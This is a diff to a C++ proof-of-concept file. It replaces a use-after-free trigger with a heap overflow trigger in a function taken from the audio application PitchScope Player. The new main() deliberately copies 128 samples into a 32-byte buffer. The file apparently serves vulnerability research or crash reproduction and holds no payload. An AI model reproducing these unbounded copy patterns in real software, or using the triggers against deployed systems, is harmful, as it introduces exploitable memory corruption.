@@ -1,72 +1,172 @@
+// poc_sndsample.cpp
+#include <cstdint>
+#include <cstring>
 #include <cstdio>
 #include <cstdlib>
-#include <cstring>
 
-struct BitSourceStatic
+typedef const char* CString;
+CString retErrorMesg = nullptr;
+
+// mock enum matching original code
+namespace TransformMap
 {
-    char* m_staticBits;
-    long m_totalBytes;
+    const short LEFTj = 0;
+    const short RIGHTj = 1;
+    const short CENTEREDj = 2;
+}
 
-    BitSourceStatic() : m_staticBits(nullptr), m_totalBytes(0) {}
-    ~BitSourceStatic()
+class SndSample
+{
+public:
+    char* m_bits;
+    char* m_bitsRightStereo;
+    long m_totalSamps;
+    long _chunkSize;
+    long _sampleRate;
+    void* _ChunkMap;
+    bool m_showProgressBar;
+
+    SndSample(long numSamps, long chkSize)
     {
-        if(m_staticBits)
+        _sampleRate = 44100;
+        _ChunkMap = NULL;
+        _chunkSize = chkSize;
+        m_totalSamps = 0;
+        m_bits = (char*)malloc(numSamps);
+        m_bitsRightStereo = NULL;
+        if (m_bits != NULL)
         {
-            free(m_staticBits);
-            m_staticBits = nullptr;
+            m_totalSamps = numSamps;
+            memset(m_bits, 0, m_totalSamps);
         }
+        m_showProgressBar = true;
+    }
+    ~SndSample()
+    {
+        if (m_bits != NULL)
+        {
+            free(m_bits);
+            m_bits = NULL;
+        }
+        if (m_bitsRightStereo != NULL)
+        {
+            free(m_bitsRightStereo);
+            m_bitsRightStereo = NULL;
+        }
+        if (_ChunkMap != NULL)
+            delete _ChunkMap;
     }
 
-    bool Alloc_Static_Block(long numBytes)
+    bool Is_Stereo_Sample()
     {
-        if(m_staticBits)
+        return (m_bitsRightStereo != NULL);
+    }
+
+    char* Get_StartByte()
+    {
+        if (m_bits == NULL)
+            return NULL;
+        return m_bits;
+    }
+
+    // Original vulnerable function from PitchScope Player
+    bool CopyBits_From_16bit_Sample(short channelCode, char *srcByte, long sampOffset, long totalSamples, CString& retErrorMesg)
+    {
+        if (Is_Stereo_Sample())
         {
-            free(m_staticBits);
-            m_staticBits = nullptr;
-        }
-        m_staticBits = static_cast<char*>(malloc(numBytes));
-        m_totalBytes = numBytes;
-        if(!m_staticBits)
-        {
-            m_totalBytes = 0;
+            retErrorMesg = "SndSample::CopyBits_From_16bit_Sample FAILED,  needs code for stereo SndSample.";
             return false;
         }
-        memset(m_staticBits, 0x41, numBytes);
+        char *dest = Get_StartByte();
+        long bytesInSample = 4;
+        long offsetInBytes = sampOffset * bytesInSample;
+        srcByte += offsetInBytes;
+
+        retErrorMesg = nullptr;
+        if (srcByte == NULL)
+        {
+            retErrorMesg = "SndSample::CopyBits_From_16bit_Sample  failed,  NULL source byte.";
+            return false;
+        }
+        if (totalSamples <= 0)
+        {
+            retErrorMesg = "SndSample::CopyBits_From_16bit_Sample  failed,  SoundSample is empty.";
+            return false;
+        }
+        if (dest == NULL)
+        {
+            retErrorMesg = "SndSample::CopyBits_From_16bit_Sample  failed,  SoundSample is NULL.";
+            return false;
+        }
+        short leftVal, rightVal;
+        if (channelCode == TransformMap::LEFTj)
+        {
+            for (int k = 0; k < totalSamples; k++)
+            {
+                srcByte++;
+                *dest = *srcByte;
+                leftVal = *srcByte;
+                srcByte++;
+                dest++;
+                srcByte++;
+                srcByte++;
+            }
+        }
+        else if (channelCode == TransformMap::RIGHTj)
+        {
+            for (int k = 0; k < totalSamples; k++)
+            {
+                srcByte++;
+                srcByte++;
+                srcByte++;
+                *dest = *srcByte;
+                srcByte++;
+                dest++;
+            }
+        }
+        else if (channelCode == TransformMap::CENTEREDj)
+        {
+            for (int k = 0; k < totalSamples; k++)
+            {
+                srcByte++;
+                leftVal = *srcByte;
+                srcByte++;
+                srcByte++;
+                rightVal = *srcByte;
+                *dest = (char)((leftVal + rightVal) / 2);
+                srcByte++;
+                dest++;
+            }
+        }
+        else
+        {
+            retErrorMesg = "SndSample::CopyBits_From_16bit_Sample  failed,  unknown channelCode.";
+            return false;
+        }
         return true;
-    }
-};
-
-struct AudioStaticPlayer
-{
-    BitSourceStatic* m_bitSource;
-
-    AudioStaticPlayer() : m_bitSource(nullptr) {}
-
-    // Vulnerable: dereference dangling m_bitSource pointer
-    void Read_From_BitSource()
-    {
-        if (!m_bitSource)
-            return;
-        // Use-After-Free read: access member of already deleted BitSourceStatic object
-        char val = m_bitSource->m_staticBits[0];
-        (void)val;
     }
 };
 
 int main()
 {
-    AudioStaticPlayer player;
-    BitSourceStatic* bitSrc = new BitSourceStatic();
+    // Allocate tiny destination buffer: only 32 bytes
+    SndSample* s = new SndSample(32, 1024);
 
-    bitSrc->Alloc_Static_Block(32);
-    player.m_bitSource = bitSrc;
+    // Source buffer, large enough to avoid src read OOB for this test
+    char* srcBuf = (char*)malloc(4096);
+    memset(srcBuf, 0x42, 4096);
 
-    // Delete the BitSourceStatic object, player.m_bitSource becomes dangling pointer
-    delete bitSrc;
+    // Trigger: totalSamples far larger than m_totalSamps (32) → heap overflow write
+    long totalSamples = 128;
+    bool ok = s->CopyBits_From_16bit_Sample(TransformMap::LEFTj, srcBuf, 0, totalSamples, retErrorMesg);
 
-    // Trigger UAF: access the dangling pointer
-    player.Read_From_BitSource();
+    if (!ok && retErrorMesg != nullptr)
+    {
+        printf("Error: %s\n", retErrorMesg);
+    }
 
+    free(srcBuf);
+    delete s;
     return 0;
 }
 
